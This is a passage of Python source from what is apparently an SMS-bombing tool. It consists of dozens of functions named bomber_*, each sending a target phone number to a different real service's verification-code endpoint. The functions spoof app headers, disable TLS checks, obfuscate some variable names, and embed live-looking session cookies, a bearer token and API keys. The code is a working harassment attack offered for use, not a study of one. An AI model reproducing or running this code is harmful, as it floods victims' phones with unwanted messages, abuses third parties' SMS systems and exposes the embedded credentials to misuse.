    url = 'https://ppl.ming.net.cn/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_colo_app_laniakeasc_com(phone):
    url = 'https://colo-app.laniakeasc.com/prod-api/api/Sms/sendCode'
    data = {'mobile': phone}
    headers = {'Client-Type': 'Android', 'envVersion': 'release', 'Authorization': 'Bearer', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_app_zhuxing_vip(phone):
    'zhuxing.vip 发送验证码'
    url = 'http://app.zhuxing.vip/api/sms/send'
    payload = {'event': 'mobilelogin', 'mobile': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_zhuxing_vip(phone):
    'zhuxing.vip 发送验证码（注册）'
    url = 'http://app.zhuxing.vip/api/sms/send'
    payload = {'event': 'register', 'mobile': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_chukexia_com_cn(phone):
    url = 'http://app.chukexia.com.cn/server/user/registerCode'
    payload2 = {'phoneNumber': phone}
    headers = {'version': '1.0.4', 'cache-control': 'no-cache', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.2.2'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_wap_5kejia_com(phone):
    url = ''.join(['https://wap.5kejia.com/sqx_fast/app/Login/sendMsg/', str(phone), '/1'])
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.get(url, headers=headers, timeout=10, verify=False)

def bomber_www_laidaquan_com(phone):
    'laidaquan.com 发送验证码'
    url = 'https://www.laidaquan.com'
    payload2 = {'scene': '1001', 'pid': '0', 'session_id': 'e8199f3666e25499ea70721cc45c721b', 'platform': 'app', 'aid': '2', 's': '/ApiIndex/sendsms'}
    payload = {'tel': phone}
    headers = {'Cookie': 'server_name_session=994b5bae3ccd22b065c58e8effd2c75d; PHPSESSID=e8199f3666e25499ea70721cc45c721b', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_1009_com_cn(phone):
    '1009.com.cn 发送验证码'
    url = 'https://app.1009.com.cn/plugin.php'
    payload2 = {'operation': 'send', 'method': 'register', 'phone': phone, 'module': 'SendCode', 'version': '1', 'token': 'access_token', 'id': 'rtj1009_api'}
    headers = {'Cookie': 'K0YO_2132_lastvisit=1781335187; K0YO_2132_saltkey=zjw7z7IH; SITE_TOTAL_ID=a9ceee84d0ac6eb2d5620892c38c018a; K0YO_2132_lastact=1781338788%09forum.php%09image; K0YO_2132_sid=SW58aj', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_1009_com_cn(phone):
    '1009.com.cn 发送验证码'
    url = 'https://app.1009.com.cn/plugin.php'
    payload2 = {'operation': 'send', 'method': 'register', 'phone': phone, 'module': 'SendCode', 'version': '1', 'token': 'access_token', 'id': 'rtj1009_api'}
    headers = {'Cookie': 'K0YO_2132_lastvisit=1781335187; K0YO_2132_saltkey=zjw7z7IH; SITE_TOTAL_ID=a9ceee84d0ac6eb2d5620892c38c018a; K0YO_2132_lastact=1781338799%09plugin.php%09; K0YO_2132_cookiesms779150=7b06WxERIreEdNTwufy0OCdWLbdjNcPPv4TvzTGeh11gTrVpoZ6okFxEuIWZ%2BSt6Ju2NeoiQt0%2BpNgS1yzU55qjIA2G5mEyuqJF7Qhp7JIkd3Fi17I0CjbuCmkmBAb0iLjfZLx5yjKpYAWPE3RqO%2BwIEQOoYisX5aQ; K0YO_2132_sid=fbvNbc; K0YO_2132_cookiesms103044=ca878nfIHBipZtb1kyABYr%2FrTSYBC1ahrutKVXmmFOKVeWE1ZwA3jMQbo8PujJ%2Fd00YLB1k7lVkUA4BFsQUuuBMi5v%2FhUBkFYSxE6xEbKYLdLtxswHmFfclZen0e0AFMEAASE785%2B0xGA%2Beg0PX%2FpTj5S6MuEou0Cg', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_m_taiyouhe_com(phone):
    url = 'http://m.taiyouhe.com/api/v1/6209bca8765f5'
    payload = {'type': 1, 'mobile': phone, 'is_test': 0}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'Accept-Serial': '256ae9d3fbeb821aeaa3f055a4721cb1', 'Accept-Language': 'zh-CN,zh', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 16; zh-cn; PJE110 Build/TP1A.220905.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_m_taiyouhe_com(phone):
    url = 'http://m.taiyouhe.com/api/v1/6209bca8765f5'
    payload = {'type': 3, 'mobile': phone, 'is_test': 0}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'Accept-Serial': '256ae9d3fbeb821aeaa3f055a4721cb1', 'Accept-Language': 'zh-CN,zh', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 16; zh-cn; PJE110 Build/TP1A.220905.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_yq_ucanyun_com(phone):
    url = 'https://yq.ucanyun.com/api/user/sendVerifyCode'
    payload = {'channel': 1, 'type': 4, 'mobile': phone}
    headers = {'X-Sign': 'ce24f2d4b64f052b7a7d5e3db6f1e771', 'X-Client-Version': 'PJE110/Android 16/1.0.0', 'X-Client': 'user_app', 'X-Timestamp': '1781339142', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_dada_wanwujiekedayouda_com(phone):
    'wanwujiekedayouda.com 发送验证码'
    url = 'https://dada.wanwujiekedayouda.com/api/sms/send'
    payload = {'verison': 151, 'source_model': 'mobile', 'event': 'mobilelogin', 'mobile': phone}
    headers = {'Cookie': 'server_name_session=77c40b01375624ae4d51faf6dc1155a2', 'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_dada_wanwujiekedayouda_com(phone):
    'wanwujiekedayouda.com 发送验证码（注册）'
    url = 'https://dada.wanwujiekedayouda.com/api/sms/send'
    payload = {'verison': 151, 'source_model': 'mobile', 'event': 'register', 'mobile': phone}
    headers = {'Cookie': 'server_name_session=77c40b01375624ae4d51faf6dc1155a2', 'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_szquandz_com(phone):
    'szquandz.com 发送验证码'
    url = 'https://app.szquandz.com/quandazi-app/api/v1/sms/aliSend'
    payload = {'cid': '24fd49749ca5b30f1a2f052c4a8d4f7fb', 'event': 'login', 'model': 'OnePlus PJE110', 'client': '1', 'mobile': phone}
    headers = {'authorization': 'Bearer', 'accept-language': 'zh-CN,zh;q=0.9', 'versionnum': '108', 'version': '1.0.8', 'type': 'Android', 'token': '', 'Accept-Encoding': 'identity', 'User-Agent': 'okhttp/3.14.9'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_travel_partner_car_yucunkeji_com(phone):
    'yucunkeji.com 发送验证码（接口可能异常）'
    url = 'https://travel-partner.car.yucunkeji.com/api/yc-im/sendSmsCode'
    payload = {'phone': phone}
    headers = {'content-type': 'application/json;charset=utf-8', 'app-version': '1.0.13', 'Accept-Encoding': 'gzip', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_web_zzyskj_com(phone):
    'zzyskj.com 发送验证码'
    url = 'https://web.zzyskj.com/app-api/member/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone, 'equipment': 'oneplus PJE110'}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_www_tongchengquanxi_com(phone):
    'tongchengquanxi.com 发送验证码'
    url = 'https://www.tongchengquanxi.com/api/sms/sendCode'
    payload = {'scene': 'ZHDLMM', 'mobile': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_blink_app_17gwx_com(phone):
    '17gwx.com 发送验证码（接口可能异常）'
    url = 'https://api-blink-app.17gwx.com/blink/user/send_sms'
    payload2 = {'channel': 'oppo', 'app_version': '1.6', 'device_brand': 'oneplus', 'device_id': '46b70abd72b879c3', 'platform': 'android', 'sms_type': '1', 'area_code': '86', 'mobile': phone}
    headers = {'content-type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'okhttp/4.9.2'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_shxy_originalart_cn(phone):
    url = 'https://shxy.originalart.cn/app/sendMsg'
    payload = {'mobile': phone, 'scene': 5}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'platform': 'android', 'deviceID': '9c8d4a1d32ec323b', 'brand': 'OnePlus', 'deviceModel': 'PJE110', 'osVersion': '16', 'os': 'Android', 'appVersion': '3.1.5', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.13'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_ninzhi_com(phone):
    'ninzhi.com 发送验证码'
    url = 'https://www.ninzhi.com/index.php'
    payload2 = {'types': 'regphonecode', 'api': ''}
    payload = {'type': 'phone', 'phone': phone}
    headers = {'Cookie': 'PHPSESSID=is9m91cst36ad6t4qg4e08dsr0', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_yuehuomusic_com(phone):
    'yuehuomusic.com 发送验证码'
    url = 'https://api.yuehuomusic.com/auth/sms/send'
    payload2 = {'phone': phone}
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Language': 'zh-CN', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=False)

def bomber_tgg_puhuaweb_com(phone):
    'puhuaweb.com 发送验证码'
    url = 'https://tgg.puhuaweb.com/sms/index.php'
    payload2 = {'tel': phone}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_m_miansha2020_com(phone):
    'miansha2020.com 发送验证码'
    url = 'https://m.miansha2020.com/api/verificationCodes'
    payload = {'phone': phone}
    headers = {'User-Agent': 'okhttp/3.14.7', 'Accept-Encoding': 'gzip', 'Host': 'm.miansha2020.com', 'Authorization': '', 'Connection': 'close', 'Content-Type': 'application/json; charset=UTF-8'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_u_shytkjgs_com(phone):
    'shytkjgs.com 发送验证码'
    url = 'https://u.shytkjgs.com/user/v1/sms/code'
    payload = {'mobile': phone}
    headers = {'User-Agent': 'okhttp/4.10.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'u.shytkjgs.com', 'Content-Type': 'application/json; charset=UTF-8', 'font_scale': '1.0', 'support_h265': '0', 'ab_id': '', 'device_id': '23ae74c58c7e03b96baa9e6822373f4bc', 'uuid': 'randomUUID_c147b26c-0da5-485a-81cf-e756b5ec3d69', 'msa_oaid': '97593b844370ce7adf3985123c81b89c122629a7e443ff70700866f66279391d', 'oaid': '97593b844370ce7adf3985123c81b89c122629a7e443ff70700866f66279391d', 'raw_channel': 'default', 'channel': 'default', 'os_version': '14', 'device_brand': 'vivo', 'device_type': 'iPA2375', 'personalized_recommend_status': '1', 'device_platform': 'android', 'app_version': '3.9.5', 'dev_token': '', 'user_agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36', 'version_name': '3.9.5', 'manufacturer': 'vivo', 'platform': '1', 'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODI4MDYyMDUsIlVzZXJJZCI6MTYzOTM4NTg4LCJyZWdpc3Rlcl90aW1lIjoiMjAyNi0wNi0xNSAxNTo1NjozOSIsImlzX21vYmlsZV9iaW5kIjpmYWxzZSwiZCI6IjIzYWU3NGM1OGM3ZTAzYjk2YmFhOWU2ODIyMzczZjRiYyJ9.qBi5Qws3zZGdozKhiFTNOWZAkPlu_a5Zc9ZQRS5SXTA', 'X-App-Id': '7'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_sdjzq_tianpaiwl_com(phone):
    'tianpaiwl.com 发送验证码'
    url = 'https://sdjzq.tianpaiwl.com/captcha/smsv2'
    payload = {'userToken': '0LCRR8yr0SaYXtw8L6D71bzBTYMjUR0LMYESTHFq2tOP81781511374473', 'type': 1, 'phoneNumber': phone, 'countryCode': '86', 'appVersion': 'V1.1.8'}
    headers = {'usertoken': '0LCRR8yr0SaYXtw8L6D71bzBTYMjUR0LMYESTHFq2tOP81781511374473', 'oaid': '97593b844370ce7adf3985123c81b89c122629a7e443ff70700866f66279391d', 'imei': '1def6db0-690b-44f1-b632-84760317bf71', 'x-nonce': '62879407', 'x-signature': 'fad16577739afe25ccfd5a310afc47b57a05e37ee564a2fe67c875591b220529', 'x-timestamp': '1781511418660', 'x-api-key': '461161f94a2f6d6d68a108f686bb599ddc715b57', 'User-Agent': 'CSII-MOBILE', 'Content-Type': 'application/json; charset=utf-8'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_cloud_ace_bot_cn(phone):
    'ace-bot.cn 发送验证码'
    url = 'https://cloud.ace-bot.cn/api/user/InviteRegSendSms'
    data = {'invited': '658449', 'skip_claim_check': 'false', 'skip_existence_check': 'false', 'tel': phone}
    headers = {'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Referer': 'https://cloud.ace-bot.cn/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Origin': 'https://cloud.ace-bot.cn', 'sec-ch-ua-mobile': '?0', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Safari/537.36 VivoBrowser/6.0.0.7 DeviceType/tablet', 'sec-ch-ua-platform': '"Linux"', 'Connection': 'keep-alive', 'Host': 'cloud.ace-bot.cn'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_api_xiawen_tv(phone):
    'xiawen.tv 发送验证码（只需修改URL中的手机号）'
    url = ''.join(['https://api.xiawen.tv/api/v1/user/sendsms/forLogin?countryCallingCode=%2B86&phoneNumber=', str(phone)])
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.xiawen.tv', 'rp': 'NpC8e5Kk7f4eVGj19AYEU3ip8uU6SY9ivpWcBjtGqdmp6tJqG8iuLepBAOxK3OMlGJFC2G1l3bHN3L37Zmp6KbCIo6o5jpCpK/kWYLbdCjItTpfIeOMbiOfvYO76lj59pvSABU687lYsAwjnqH3l695jPXL3fyLFkuS0KT8ZZ9452I1aS/Smq+KQlFDC2ZCSERAJNTrwH2EXr9xOv5jAjJc1SgPidLPr1HpWXPjl+ndzbdreB3sSupkgN1Z7/LtCpPcKK7mrV6sW1VdComgFKgQ2S52oiPlPFS3UL4JTyiwdsiEJ3qzV2EBMt0qQiAuZUHIDSg1n9L7EKlJTIY7MzIK0b1/uz4YsA1r9zF1QYZFGyfER9GLJjuNoYk+BMa9Tv1BnrNrtKrmrBRyPtYX8upL7iyZWl0KXhpOeboW5FYl5UE4yNGeA5rpWqsz8/UAyxrabLEI5dbGFc45xBPceM+zlFFSViwqSuhd2n0CYXTOiHzzf/ewtbAQkppxlj7pmWQgn+4ud+T/AMjhC0dG0kQ==', 'di': 'uTbdelO9VSZGqn0xXzUetBb9B5uMfBt0xtmhY4cehPw=', 'said': '247eb0d5160bb45f', 'User-Agent': 'ZTV/1.7.4 (iPA2375; Android 14; Scale/2.00)', 'app-type': 'ztv', 'channel': 'vivo', 'version-name': '1.7.4', 'version': 'a_22590'}
    requests.get(url, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_eyepetizer_net(phone):
    url = ''.join(['https://api.eyepetizer.net/v1/verify/sms/send_sms_code?mobile=', str(phone), '&country_code=86&type=login_sms&verify_type=sms&ticket=&rand_str=&udid=7159a44f87d34108b115c4abc44754b5&vc=7090000&vn=7.9.0&deviceModel=iPA2375&size=1968X2800&first_channel=huawei&last_channel=huawei&system_version_code=34&token='])
    headers = {'Host': 'api.eyepetizer.net', 'Cookie': 'ky_udid=7159a44f87d34108b115c4abc44754b5;ky_auth=;PHPSESSID=87b17865f2c2396f207b24c44b97abc6;APPID=ahpagrcrf2p7m6rg', 'X-THEFAIR-CID': 'a23ad6e219ff57a67ccaf212294b2786', 'X-THEFAIR-AUTH': 'acR7vP8hzA8WzlePRc72iQ4iiOh0RlcmuoSsaVh84PhIU27QiWad0keRDMfTUc5gHg2ATU5+C1fLChEc0fMVnH6m/7GjF9hPfUJ+OgsmOArvGakV4+xXc4olN062gQOk4Sf2+siPEgT2i8yASVQlBzMQ1+1zjcHJnLgoMSGW17Ko4PwhAlK0ZlJdIJxW3yW2ClEGO/cRgoRcwV8uZ0rNfEgxUDarwhpOmNi43x98BHFMt7Cg1XXY3F3wG6mpnEdZt9+4CQApHvkBvEscrmCz4Q==', 'X-THEFAIR-APPID': 'ahpagrcrf2p7m6rg', 'User-Agent': 'EYEPETIZER/7090000 (iPA2375;android;14;zh_CN;android;7.9.0;cn-bj;huawei;a23ad6e219ff57a67ccaf212294b2786;WIFI;1968*2800) native/1.0', 'x-api-key': '0530ee4341324ce2b26c23fcece80ea2'}
    requests.get(url, headers=headers, timeout=10, verify=(1 == 0))

def bomber_s_kuailon_com(phone):
    'kuailon.com 发送验证码'
    url = 'https://s.kuailon.com/wxapi/manage/sms'
    data = {'app_version': '3', 'app_osName': 'android', 'app_name': '快隆惠递', 'app_plate': 'vivo', 'appid': 'wx165650a77afdc8a5', 'enter_scene': '1001', 'nauthor': 'false', 'brand': '0', 'pf': '', 'pint': 'wx', 'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 's.kuailon.com', 'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'Accept': 'application/json'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_mec_yto_net_cn(phone):
    'yto.net.cn 发送验证码'
    url = 'https://mec.yto.net.cn/api/loginsendsms'
    payload2 = {'username': phone}
    payload = {'username': phone}
    headers = {'User-Agent': 'okhttp/3.12.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'mec.yto.net.cn', 'Content-Type': 'application/json; charset=UTF-8', 'jwt-token': '', 'Accept-Language': 'zh_CN', 'source': 'ANDROID', 'Accept': 'application/json'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_youhq007_com(phone):
    'youhq007.com 发送验证码'
    url = 'https://app.youhq007.com/wxapi/manage/sms'
    data = {'app_version': '24', 'app_osName': 'android', 'app_name': '物流大件', 'app_plate': 'vivo', 'appid': '2021003177606750', 'enter_scene': '1001', 'nauthor': 'false', 'brand': '6874', 'pf': '', 'pint': 'ali', 'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'app.youhq007.com', 'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'Accept': 'application/json'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_wuyou_order_sto_cn(phone):
    'sto.cn 发送验证码'
    url = 'https://wuyou-order.sto.cn/mobileapp/superMerchant/getSMSVerificationCode'
    payload = {'mobile': phone}
    headers = {'Host': 'wuyou-order.sto.cn', 'clienttype': 'android', 'nonce': '3f0cd450-6933-11f1-90a7-07b0129a7ee7', 'signature': 'e365ecb7a6bca3687063b79c04e61585', 'traceid': '311c97f6f6c40dc59df1258d1f8c5323', 'mac': '', 'timestamp': '1781580439517', 'content-type': 'application/json', 'buildnumber': '154', 'channel': 'VIVO', 'accept-encoding': 'gzip', 'appversion': '1.15.2', 'appid': '1', 'source': 'mobileapp', 'user-agent': 'Dart/3.10 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_yuni_baby(phone):
    url = 'https://yuni.baby/yuni-backend/api/user/permit/sms-code'
    data = {'sendType': '2', 'userTel': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'yuni.baby', 'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app (Immersed/28.0) Html5Plus/1.0', 'token': '', 'platform': 'app'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_www_xizai_com(phone):
    'xizai.com 发送验证码'
    url = 'https://www.xizai.com/trade/api/sendvcode'
    payload2 = {'vp': '215581FD005DDD7BDBD3460CA5A1C1BC', 'netType': '45774768', 'sType': '1', 'phone': phone}
    headers = {'Host': 'www.xizai.com', 'unittype': 'iPA2375', 'sign': '8ed9fc013f1df06ee5c01ff04b798abc', 'token': '', 'platform': 'android', 'buildnumber': '80010', 'createtime': '1781593751904448', 'apppackage': 'com.youguo.xizai', 'accept-encoding': 'gzip', 'appversion': '8.0.10', 'deviceid': 'd09bea0c82f19b10', 'networksource': 'ConnectivityResult.wifi', 'user-agent': 'Dart/2.19 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_v4_passport_sohu_com(phone):
    '搜狐 发送验证码（支持任意手机号）'
    Crh2Rxuq_IVsYFbKqs5UMTB8yfF1vCgPLsad2_ = int((time.time() * 1000))
    VQvYMiuMz0mAUAawBMUCGhfKf9fT8TARpa = str(Crh2Rxuq_IVsYFbKqs5UMTB8yfF1vCgPLsad2_)
    AhblErzY3Js0EaLY_2y4UTvlvUSSTb8ohVh4hqzAOJLO9djlOrsjruE = ''.join(['passport4014_cb', str(Crh2Rxuq_IVsYFbKqs5UMTB8yfF1vCgPLsad2_)])
    G4XfnJWC8xIXdx17g1Se8MdSRjxH5BV46HKtr9ehRnW65czIqKWBo96i0FRb = str((Crh2Rxuq_IVsYFbKqs5UMTB8yfF1vCgPLsad2_ + 1))
    url = 'https://v4.passport.sohu.com/i/smcode/mobile/v2/signin'
    payload2 = {'_': G4XfnJWC8xIXdx17g1Se8MdSRjxH5BV46HKtr9ehRnW65czIqKWBo96i0FRb, 'callback': AhblErzY3Js0EaLY_2y4UTvlvUSSTb8ohVh4hqzAOJLO9djlOrsjruE, 'appid': '116005', 'pagetoken': VQvYMiuMz0mAUAawBMUCGhfKf9fT8TARpa, 'validate': '', 'captcha': '', 'way': '0', 'mobile': phone, 'captchaType': 'signin'}
